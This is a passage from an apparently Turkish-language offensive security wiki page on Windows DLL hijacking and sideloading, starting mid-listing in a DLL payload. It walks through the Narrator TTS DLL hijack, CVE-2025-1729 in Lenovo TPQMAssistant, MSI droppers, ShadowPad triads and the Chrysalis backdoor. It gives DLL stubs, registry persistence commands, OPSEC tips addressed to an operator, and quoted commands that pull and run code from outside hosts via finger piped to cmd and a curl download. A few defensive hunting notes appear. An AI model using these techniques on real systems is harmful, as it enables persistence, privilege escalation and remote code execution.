CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Vaka Çalışması: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe, başlangıçta tahmin edilebilir, dile özgü bir localization DLL dosyasını hâlâ arar; bu dosya arbitrary code execution ve persistence için hijack edilebilir.<sup>[[7]](#references)</sup>

Temel bilgiler
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore path üzerinde writable, attacker-controlled bir DLL mevcutsa yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalışır. Herhangi bir export gerekmez.

Procmon ile Discovery
- Filter: `Process Name is Narrator.exe` ve `Operation is Load Image` veya `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki path için gerçekleştirilen load işlemini gözlemleyin.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC sessizlik
- Naif bir hijack konuşur/UI'ı vurgular. Sessiz kalmak için attach sırasında Narrator thread'lerini enumerate edin, ana thread'i (`OpenThread(THREAD_SUSPEND_RESUME)`) açın ve `SuspendThread` ile askıya alın; işlemi kendi thread'inizde sürdürün. Tam kod için PoC'ye bakın.<sup>[[8]](#references)</sup>

Accessibility configuration üzerinden tetikleme ve persistence
- Kullanıcı bağlamı (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdakilerle Narrator başlatıldığında yerleştirilen DLL yüklenir. Secure desktop'ta (logon screen), Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz secure desktop üzerinde SYSTEM olarak çalışır.

RDP ile tetiklenen SYSTEM execution (lateral movement)
- Klasik RDP security layer'ını etkinleştirin: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host'a RDP ile bağlanın, logon screen'de Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz secure desktop üzerinde SYSTEM olarak çalışır.
- RDP session kapatıldığında execution durur—inject/migrate işlemini hızlıca gerçekleştirin.

Kendi Accessibility aracını getir (BYOA)
- Yerleşik bir Accessibility Tool (AT) registry entry'sini (ör. CursorIndicator) clone edebilir, bunu arbitrary bir binary/DLL gösterecek şekilde düzenleyebilir, import edebilir ve ardından `configuration` değerini bu AT name olarak ayarlayabilirsiniz. Bu işlem, Accessibility framework altında arbitrary execution için proxy görevi görür.

Notlar
- `%windir%\System32` altında yazma ve HKLM değerlerini değiştirme admin rights gerektirir.
- Tüm payload logic'i `DLL_PROCESS_ATTACH` içinde bulunabilir; export gerekmez.

## Vaka Çalışması: CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Privilege Escalation

Bu vaka, Lenovo'nun TrackPoint Quick Menu'sunda (`TPQMAssistant.exe`) bulunan ve **CVE-2025-1729** olarak takip edilen **Phantom DLL Hijacking** tekniğini göstermektedir.<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `C:\ProgramData\Lenovo\TPQM\Assistant\` konumundaki `TPQMAssistant.exe`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`, logged-on user bağlamında her gün 09:30'da çalışır.
- **Directory Permissions**: `CREATOR OWNER` tarafından yazılabilir durumdadır ve local user'ların arbitrary file bırakmasına olanak tanır.
- **DLL Search Behavior**: Önce working directory'den `hostfxr.dll` yüklemeye çalışır ve eksikse "NAME NOT FOUND" log'lar; bu durum local directory search precedence'i gösterir.

### Exploit Implementation

Bir attacker, aynı directory'ye malicious bir `hostfxr.dll` stub yerleştirerek eksik DLL'den yararlanabilir ve user context altında code execution elde edebilir:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Saldırı Akışı

1. Standart bir user olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
2. Scheduled task'ın mevcut user context'i altında 09:30'da çalışmasını bekleyin.
3. Task çalıştığında bir administrator login olmuşsa, malicious DLL administrator'ın session'ında medium integrity ile çalışır.
4. Medium integrity'den SYSTEM privileges seviyesine yükselmek için standart UAC bypass tekniklerini chain'leyin.

## Vaka Çalışması: MSI CustomAction Dropper + Signed Host (wsc_proxy.exe) Üzerinden DLL Side-Loading

Threat actor'lar payload'ları trusted, signed bir process altında çalıştırmak için sıklıkla MSI-based dropper'ları DLL side-loading ile birlikte kullanır.<sup>[[10]](#references)</sup>

Zincir özeti
- User MSI'ı indirir. GUI install sırasında bir CustomAction sessizce çalışır (ör. LaunchApplication veya bir VBScript action) ve embedded resource'lardan sonraki stage'i yeniden oluşturur.
- Dropper, legitimate, signed bir EXE ile malicious bir DLL'i aynı dizine yazar (örnek pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Signed EXE başlatıldığında Windows DLL search order, önce working directory'deki wsc.dll'i yükler ve attacker code'un signed bir parent altında çalıştırılmasını sağlar (ATT&CK T1574.001).

MSI analizi (aranacaklar)
- CustomAction table:
- Executable veya VBScript çalıştıran entry'leri arayın. Şüpheli pattern örneği: background'da embedded bir file çalıştıran LaunchApplication.
- Orca'da (Microsoft Orca.exe), CustomAction, InstallExecuteSequence ve Binary table'larını inceleyin.
- MSI CAB içindeki embedded/split payload'lar:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ya da lessmsi kullanın: lessmsi x package.msi C:\out
- Bir VBScript CustomAction tarafından concatenate edilip decrypt edilen birden fazla küçük fragment arayın. Yaygın akış:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Pratik sideloading: wsc_proxy.exe
- Bu iki dosyayı aynı klasöre bırakın:
- wsc_proxy.exe: legitimate signed host (Avast). Process, wsc.dll dosyasını kendi dizininden adına göre yüklemeye çalışır.
- wsc.dll: attacker DLL. Belirli export'lar gerekmiyorsa DllMain yeterli olabilir; aksi hâlde bir proxy DLL oluşturun ve payload'ı DllMain içinde çalıştırırken gerekli export'ları genuine library'ye forward edin.
- Minimal bir DLL payload oluşturun:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Export gereksinimleri için bir proxying framework (ör. DLLirant/Spartacus) kullanarak payload'unuzu da çalıştıran bir forwarding DLL oluşturun.

- Bu teknik, DLL name resolution işleminin host binary tarafından yapılmasına dayanır. Host absolute paths veya safe loading flags (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded exports öncelik sırasını etkileyebilir; host binary ve export set seçimi sırasında bunlar dikkate alınmalıdır.

## Signed triads + encrypted payloads (ShadowPad vaka çalışması)

Check Point, Ink Dragon'un temel payload'u disk üzerinde encrypted halde tutarken meşru yazılımlarla uyum sağlamak için ShadowPad'i **üç dosyalı bir triad** kullanarak nasıl dağıttığını açıkladı:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – AMD, Realtek veya NVIDIA gibi vendor'lar kötüye kullanılır (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Saldırganlar executable'ı Windows binary'si gibi görünecek şekilde yeniden adlandırır (örneğin `conhost.exe`), ancak Authenticode signature geçerliliğini korur.
2. **Malicious loader DLL** – beklenen bir adla EXE'nin yanına bırakılır (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL genellikle ScatterBrain framework'üyle obfuscate edilmiş bir MFC binary'sidir; tek görevi encrypted blob'u bulmak, decrypt etmek ve ShadowPad'i reflectively map etmektir.
3. **Encrypted payload blob** – genellikle aynı directory içindeki `<name>.tmp` olarak saklanır. Decrypted payload memory-map edildikten sonra loader, forensic evidence'ı yok etmek için TMP file'ını siler.

Tradecraft notları:

* Signed EXE'yi yeniden adlandırmak (PE header içindeki orijinal `OriginalFileName` korunurken), vendor signature'ını muhafaza ederek Windows binary'si gibi görünmesini sağlar; bu nedenle Ink Dragon'un gerçekte AMD/NVIDIA utility'leri olan `conhost.exe` görünümlü binary'ler bırakma alışkanlığını taklit edin.
* Executable trusted kaldığından, allowlisting kontrollerinin çoğu yalnızca malicious DLL'nizin yanına yerleştirilmesini gerektirir. Loader DLL'yi özelleştirmeye odaklanın; signed parent genellikle değiştirilmeden çalıştırılabilir.
* ShadowPad decryptor, TMP blob'un loader'ın yanında bulunmasını ve mapping sonrasında file'ı zero edebilmek için writable olmasını bekler. Payload yüklenene kadar directory'yi writable tutun; memory'ye alındıktan sonra TMP file OPSEC amacıyla güvenle silinebilir.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operator'ler DLL sideloading'i LOLBAS ile birleştirir; böylece disk üzerindeki tek custom artifact trusted EXE'nin yanındaki malicious DLL olur:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell `cmd.exe /c` başlatır, komutları bir Finger server'dan çeker ve `cmd`'ye pipe eder:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` TCP/79 text'i çeker; `| cmd` server response'u execute eder ve operator'lerin second stage server'ını server-side rotate etmesine olanak tanır.

- **Built-in download/extract:** Benign bir extension'a sahip archive'ı download edin, unpack edin ve sideload target ile DLL'yi rastgele bir `%LocalAppData%` folder'ı altında stage edin:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` progress'i gizler ve redirect'leri takip eder; `tar -xf`, Windows'un built-in tar'ını kullanır.

- **WMI/CIM launch:** EXE'yi WMI üzerinden başlatın; böylece telemetry, colocated DLL'yi yüklerken CIM tarafından oluşturulmuş bir process gösterir:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Local DLL'leri tercih eden binary'lerle çalışır (ör. `intelbq.exe`, `nearby_share.exe`); payload (ör. Remcos) trusted name altında çalışır.

- **Hunting:** `/p`, `/m` ve `/c` seçenekleri birlikte göründüğünde `forfiles` için alert oluşturun; admin script'leri dışında bu kullanım yaygın değildir.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Yakın tarihli bir Lotus Blossom intrusion'ı, NSIS-packed bir dropper teslim etmek için trusted bir update chain'i kötüye kullandı; bu dropper DLL sideloading ve tamamen in-memory payload'lar stage etti.<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe` (NSIS) `%AppData%\Bluetooth` oluşturur, bunu **HIDDEN** olarak işaretler, yeniden adlandırılmış bir Bitdefender Submission Wizard `BluetoothService.exe`, malicious bir `log.dll` ve encrypted bir blob olan `BluetoothService` bırakır, ardından EXE'yi başlatır.
- Host EXE, `log.dll` import eder ve `LogInit`/`LogWrite` çağırır. `LogInit`, blob'u mmap-load eder; `LogWrite`, blob'u custom LCG-based stream ile decrypt eder (constants **0x19660D** / **0x3C6EF35F**, key material önceki bir hash'ten türetilir), buffer'ı plaintext shellcode ile overwrite eder, temp'leri free eder ve shellcode'a jump eder.
- IAT kullanmamak için loader, export name'lerini **FNV-1a basis 0x811C9DC5 + prime 0x1000193** kullanarak hash'ler; ardından bir Murmur-style avalanche (**0x85EBCA6B**) uygular ve salted target hash'leriyle karşılaştırır.

Main shellcode (Chrysalis)
- Beş pass boyunca `gQ2JR&9;` key'iyle add/XOR/sub işlemlerini tekrarlayarak PE-like main module'ün decrypt işlemini yapar; ardından import resolution'ı tamamlamak için `Kernel32.dll` → `GetProcAddress` dinamik olarak yükler.
- DLL name string'lerini runtime'da karakter başına bit-rotate/XOR transform'larıyla yeniden oluşturur; ardından `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` yükler.
- İkinci bir resolver, **PEB → InMemoryOrderModuleList** üzerinden ilerler, her export table'ı 4-byte block'lar halinde Murmur-style mixing ile parse eder ve yalnızca hash bulunamazsa `GetProcAddress`'e fallback yapar.

Embedded configuration & C2
- Config, bırakılan `BluetoothService` file'ı içinde **offset 0x30808**'de (**0x980** size) bulunur ve `qwhvb^435h&*7` key'iyle RC4-decrypt edilir; böylece C2 URL'si ve User-Agent ortaya çıkar.
- Beacon'lar dot-delimited bir host profile oluşturur, başına `4Q` tag'ini ekler ve HTTPS üzerinden `HttpSendRequestA` çağrısından önce `vAuig34%^325hGV` key'iyle RC4-encrypt eder. Response'lar RC4-decrypt edilir ve bir tag switch ile dispatch edilir (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode CLI args ile kontrol edilir: args yoksa `-i`'yi gösteren persistence (service/Run key) install edilir; `-i`, self'i `-k` ile yeniden başlatır; `-k`, install'ı atlar ve payload'u çalıştırır.

Alternate loader observed
- Aynı intrusion, Tiny C Compiler'ı bıraktı ve `C:\ProgramData\USOShared\` içinden `svchost.exe -nostdlib -run conf.c` çalıştırdı; `libtcc.dll` de yanına yerleştirildi. Saldırgan tarafından sağlanan C source shellcode içeriyor, compile ediliyor ve disk üzerinde PE'ye dokunulmadan in-memory çalıştırılıyordu. Şununla replicate edin:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- TCC tabanlı bu derle-and-çalıştır aşaması, çalışma zamanında `Wininet.dll` içe aktardı ve sabit kodlanmış bir URL'den ikinci aşama shellcode'u çekti; böylece derleyici çalışması gibi görünen esnek bir loader sağladı.

## Signed-host sideloading with export proxying + host thread parking

Bazı DLL sideloading zincirleri, meşru host'un sonraki aşamaları çökmeden temiz bir şekilde yüklemesine yetecek kadar uzun süre çalışır durumda kalmasını sağlamak için **stability engineering** teknikleri ekler.<sup>[[11]](#references)</sup>

Gözlemlenen pattern
- Beklenen `version.dll` gibi dependency adıyla güvenilir bir EXE'yi malicious DLL'in yanına bırakın.
- Malicious DLL, import resolution işleminin başarılı olması ve host process'in çalışmaya devam etmesi için **tüm beklenen export'ları** gerçek system DLL'e (örneğin `%SystemRoot%\\System32\\version.dll`) proxy'ler.
- Yüklendikten sonra malicious DLL, host entry point'ini **patch'ler**; böylece main thread, çıkmak veya process'i sonlandıracak code path'lerini çalıştırmak yerine sonsuz bir `Sleep` loop'una girer.
- Yeni bir thread gerçek malicious işi gerçekleştirir: sonraki aşama DLL adını veya path'ini decrypt eder (RC4/XOR yaygındır), ardından `LoadLibrary` ile yükler.

Neden önemli?
- Normal DLL proxying API compatibility'yi korur, ancak host'un sonraki aşamalar için yeterince uzun süre çalışır durumda kalacağını garanti etmez.
- Main thread'i `Sleep(INFINITE)` içinde park etmek, loader decrypting, staging veya network bootstrap işlemlerini worker thread'de gerçekleştirirken signed process'i resident durumda tutmanın basit bir yoludur.
- Yalnızca şüpheli bir `DllMain` aramak bu pattern'i gözden kaçırabilir; ilgi çekici davranış host entry point patch'lenip secondary thread başlatıldıktan sonra gerçekleşebilir.

Minimal workflow
1. Signed host EXE'yi kopyalayın ve local directory'den resolve ettiği DLL'i belirleyin.
2. Aynı function'ları export eden ve bunları legitimate DLL'e forward eden bir proxy DLL oluşturun.
3. `DllMain(DLL_PROCESS_ATTACH)` içinde bir worker thread oluşturun.
4. Bu thread'den host entry point'ini veya main thread start routine'ini patch'leyerek `Sleep` üzerinde loop yapmasını sağlayın.
5. Sonraki aşama DLL adını/config bilgisini decrypt edin ve `LoadLibrary` çağırın veya payload'u manual-map edin.

Defensive pivots
- `version.dll` veya benzer yaygın library'leri `System32` yerine kendi application directory'lerinden yükleyen signed process'ler.
- Image load işleminden kısa süre sonra process entry point'inde gerçekleşen memory patch'leri; özellikle `Sleep`/`SleepEx`'e yönlendirilen jump/call'lar.
- Proxy DLL tarafından oluşturulan ve decrypted bir adla ikinci bir DLL üzerinde hemen `LoadLibrary` çağıran thread'ler.
- `ProgramData`, `%TEMP%` veya unpacked archive path'leri gibi writable staging directory'lerde vendor executable'larının yanına yerleştirilen full-export proxy DLL'leri.

## References

- [1] [Red Canary – Intelligence Insights: Ocak 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows'ta DLL hijacking. Basit C örneği.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Avrupa'yı Hedefleyen Yeni Malware Dağıtıyor](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijack'leri Windows Helpers ile Buluştuğunda](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Gh0st RAT Dağıtan Gelişen Impersonation Campaigns'in Anatomisi](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Güneydoğu Asya'daki Bir Hükümeti Hedefleyen Threat Cluster'ların Analizi](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Relay Network'ün ve Stealthy Offensive Operation'ın İç İşleyişinin Ortaya Çıkarılması](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: Lotus Blossom'un toolkit'ine Derinlemesine Bakış](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Iranian APT Screening Serpens'in 2026 Espionage Campaigns'lerinin Takibi](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: İran Conflict Sırasında Nimbus Manticore Operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Güneydoğu Asya Hükümetlerini ve Critical Infrastructure'ı Hedefliyor](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
